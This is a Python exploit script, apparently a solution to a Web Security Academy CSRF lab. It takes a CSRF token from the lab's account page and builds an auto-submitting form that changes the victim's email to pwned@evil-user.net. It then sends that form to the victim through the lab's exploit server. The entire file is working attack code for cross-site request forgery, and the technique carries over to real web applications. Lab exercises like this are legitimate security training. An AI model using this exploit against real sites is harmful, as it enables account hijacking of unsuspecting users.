import requests
from bs4 import BeautifulSoup

site = '0aa900310368f8d181ffde1b005800fd.web-security-academy.net'
s = requests.Session()

# Step 1: Extract CSRF token from my-account page
account_url = f'https://{site}/my-account'
resp = s.get(account_url)
soup = BeautifulSoup(resp.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'}).get('value')

# Step 2: Get exploit server URL
main_page = s.get(f'https://{site}/')
soup = BeautifulSoup(main_page.text, 'html.parser')
exploit_url = soup.find('a', {'id': 'exploit-link'}).get('href')

# Step 3: Craft exploit HTML with extracted CSRF token
exploit_html = f'''<html>
  <body>
    <form action="https://{site}/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="pwned@evil-user.net">
      <input type="hidden" name="csrf" value="{csrf}">
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>'''

# Step 4: Submit and deliver the exploit
formData = {
    'urlIsHttps': 'on',
    'responseFile': '/exploit',
    'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
    'responseBody': exploit_html,
    'formAction': 'DELIVER_TO_VICTIM'
}

resp = s.post(exploit_url, data=formData)
if resp.status_code == 200:
    print("[+] Exploit delivered to victim.")
else:
    print("[-] Failed to deliver exploit.")